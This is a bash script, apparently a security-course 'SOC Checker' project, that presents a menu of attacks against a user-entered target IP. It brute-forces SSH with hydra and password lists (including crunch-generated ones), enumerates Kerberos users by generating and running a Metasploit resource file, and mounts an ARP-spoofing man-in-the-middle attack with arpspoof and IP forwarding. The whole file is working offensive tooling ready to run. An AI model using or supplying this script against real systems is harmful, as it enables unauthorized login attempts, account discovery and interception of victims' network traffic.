#!/bin/bash


#Create a script that runs different attack:
#● Brute Force to the SSH service
#● Brute force to Kerberos
#● MiTM
#** allow the user to choose from the menu what attacksthey would like to use.



Green='\033[0;32m'
Cyan='\033[0;36m'
NC='\033[0m' 




function check_root {
	if [ $EUID != 0 ]; then
		echo -e "Please run script as root user\n"
		exit 2	
	fi
}
   
   
 function ATTK_Menu {

cat <<_EOF_

  
Please select Attack Choice!


	1. Brute Force to SSH service
	
	   [!]Please ensure all neccessary password list files are within the same folder with "SOC.sh" script.



	2. Kerberos User Enumeration
	
	   [!]Please ensure neccessary user_file list is within same folder with "SOC.sh" script.	
	   

	3. MITM(Man In The Middle)
	
	
	
	0. Quit

_EOF_

read -n 1 -s choice;

	case $choice in
		1)
		echo ""
		echo "[+]Brute Force Selected!"
		echo ""
		scan_type_BF
		;;
		
		2)
		echo ""
		echo "[+]Kerberos User Enumeration Selected!"
		echo ""
		scan_type_ker
		countdown
		kerberos
		;;
		
		3)
		echo ""
		echo ""
		echo -e "[+]Man In The Middle Attack Selected!"
		mitm
		;;
		
		0)
		echo ""
		echo "Quitting .. "
		sleep 1
		exit
		;;
		
		*)
		echo "[!]Not a valid choice: Please try again."
		sleep 1
		clear
		ATTK_Menu
		;;
esac

}


function scan_type_BF {
	
	# Choose between Nmap and Masscan
	
cat <<_EOF_

[+]Please choose a scan method


	1. Nmap Scan
	
	2. Masscan
	
	
	0. Quit!
	
	
_EOF_
	
	read -n 1 -s choice;
	
		case $choice in
			1) 
			Nmap
			sleep 2
			BruteSSH
			;;
			
			2)
			Masscan
			sleep 2
			BruteSSH
			;;
			
			0) 
			echo -e "[+]Thank you for using SOC Checker!"
			sleep 1
			exit
			;;
			
			*) 
			echo -e "[!]Invalid Option. Please Try again! "
			sleep 1
			scan_type_BF
			;;
		esac
	
}  
   
   
function Nmap {
	
	echo "[+]Nmap Selected!"
	echo "[+]Gathering Information on $IP ... Please wait! ..."
	sleep 2
	nmap -A $IP -p 22 > scan
	if [ -z "$(cat scan| grep 22 | grep open)" ]
		then
		echo ""
		echo "[!] No open ports available! Better Luck next time!"
		echo " Exiting .."
		sleep 2
		exit
	fi
}  
   
function Masscan {
	
	echo "[+]Masscan Selected!"
	echo -e "Enter first port of port range: "
	read fp
	echo -e "Enter last port of port range: "
	read lp
	echo "[+]Gathering Ionformation on $IP ... Please wait! ..."
	sleep 2
	masscan $IP -p"$fp"-"$lp" > scan
	if [ -z "$(cat scan | grep 22 | grep open)" ]
		then
		echo ""
		echo "[!]No open ports available! Better Luck next time!"
		echo "Exiting ..."
		sleep 2
		exit
	fi
	
}	

function BruteSSH { 
	
cat <<_EOF_	

[+]SSH port 22 is Found [!]


		
	- press [i] to input single password 
	
	- press [p] to provide a password list 
	
	- press [c] to Crunch new password list 
	
	
	- press [x] to Exit
_EOF_
	
	read -n 1 -s choice;
	
	case $choice in
	
		i)
		echo ""
		echo ""
		echo -e -n "[*] Please input single password to try:" 
		read list
		echo $list > pass
		username
		;;
	
	
		p)
		echo ""
		echo ""
		sudo updatedb
		echo -e -n "[*] Please specify password list to use:" 
		read list
		cat $list > pass
		username
		;;
		
	
		c)
		read -p "[*] Enter min char:" min
		read -p "[*] Enter max char:" max
		read -p "[*] Enter chars:" chars
		crunch $min $max $chars > pass
		;;
		
		x)
		echo -e "Thank you for using SOC Checker!"
		echo -e " BYE BYE"
		sleep 2
		exit
		;;
		
		*)
		echo "[*] You didn't choose from list, please try again"
		BruteSSH
		;;
esac

}

function username {
	
cat <<_EOF_	

	
	
	- press [i] to input a username	
		
	- press [u] to provide username list
	

	
_EOF_
	
	read -n 1 -s choice;
		
		case $choice in
		
			i)
			echo -e -n "[+]Please specify a username to use:"
			read ans  
			echo ""
			echo ""
			echo "Starting Attack....."
			sleep 2
			hydra $IP -l $ans -P pass ssh -o HR
			echo ""
			echo ""
			BF_endnote
			;;
			
		
			u)
			echo -e -n "[+]Please specify path usernames list to use:" 
			read ans
			cat $ans > usrnames.lst
			echo ""
			echo ""
			echo "[+]Starting Attack....."
			sleep 2
			hydra $IP -L usrnames.lst -P pass ssh -o HR
			echo ""
			echo ""
			BF_endnote
			;;
			
			
			*)
			echo "[!]Invalid option, please try again"
			username
			;;
	esac

}

function BF_endnote {
	
cat <<_EOF_

[+]Results have been saved under filename "HR" under the current folder

[+]Thank You for using SOC Checker!

_EOF_

}


function scan_type_ker {
	cat <<_EOF_

[+]Please choose a scan method


	1. Nmap Scan
	
	
	0. Quit!
	
	
_EOF_
	
	read -n 1 -s choice;
	
		case $choice in
			1) 
			echo "[+]Nmap Selected!"
			echo "[+]Gathering Information on $IP ... Please wait! ..."
			sleep 2
			nmap -A $IP > scan
			if [ -z "$(cat scan| grep kerberos)" ]
				then
				echo ""
				echo "[!]Kerberos Service not Detected!! Better Luck next time!"
				echo " Exiting .."
				sleep 1
				exit
			fi
			krbs_details
			krbs_enum
			echo ""
			echo ""
			krbs_endnote
			exit
			;;
			
					
			0) 
			echo -e "Thank you for using SOC Checker!"
			sleep 1
			exit
			;;
			
			*) 
			echo -e "Invalid Option. Please Try again! "
			scan_type_ker
			;;
		esac
	
}  



function krbs_details {
echo ""	
echo "[+]Kerberos Service Detected!"	
echo ""	
ker_port=$(cat scan | grep kerberos | cut -d"/" -f1)

dom_name=$(cat scan | grep "Domain name" | cut -d: -f2 | awk '{print $1}')

echo -e "[+]Host Details Detection:"
echo -e "RPORT: $ker_port"
echo -e "RHOST: $IP"
echo ""
echo ""
echo -e "[+]Domain name is currently listed as ${Green}$dom_name${NC}"


function krbs_dom {

cat <<_EOF_

[+]Would u like to use that Domain name?
[+]Please select an option [y/n]
	

_EOF_

	read -n 1 -s choice;
	
		case $choice in
			
			y)
			echo -e "Domain name: $dom_name"
			;;
			n)
			echo -e -n "Please input Domain name: "
			read dom
			echo -e "Domain Name: $dom"
			echo $dom > dom_name
			;;
			*)
			echo -e "Invalid Option. Please Try again! "
			krbs_dom
			;;
		esac

}	

krbs_dom

echo ""
echo ""
echo -e -n "Please Input user_file list: "
read uf

}
	
	
	
function countdown {
	i=5
	while [ $i -ge 0 ] ;do
         echo -e "\t${Green}[$i]${NC}"
         i=$(( "$i"-1 ))
         sleep 1s
	done
}	
	

function krbs_enum {
	echo "spool krbs.res" > "krbs_conf".rc
	echo "use auxiliary/gather/kerberos_enumusers" >> "krbs_conf".rc
	echo "set domain $dom_name" >> "krbs_conf".rc
	echo "set rhosts $IP" >> "krbs_conf".rc
	echo "set rport $ker_port" >> "krbs_conf".rc
	echo "set user_file $uf" >> "krbs_conf".rc
	echo "exploit" >> "krbs_conf".rc
	echo "exit" >> "krbs_conf".rc
	echo "msfconsole opening in T-5 seconds: "
	countdown
	msfconsole -r "krbs_conf".rc
}

function krbs_endnote {

cat <<_EOF_



[+]Results have been saved under filename "krbs.res" under the current folder

[+]Kerebros conf.rc file saved under current folder.



[+]Thank You for using SOC Checker!

_EOF_

}
		
function mitm {
	
echo "Please enter the router IP: "
read router
echo "Please enter the victim IP: "
read victim

echo "[+]Starting miTm attack....."
echo "[+]Press ctrl+c to terminate attack"


echo '1'> /proc/sys/net/ipv4/ip_forward

xterm -e bash -c "arpspoof -t $router $victim" &
xterm -e bash -c "arpspoof -t $victim $router" &

}		
	
check_root	


echo -e " \n-- Welcome to SOC Project! -- \n"

echo -e -n " Please enter Target IP: "
read IP


ATTK_Menu
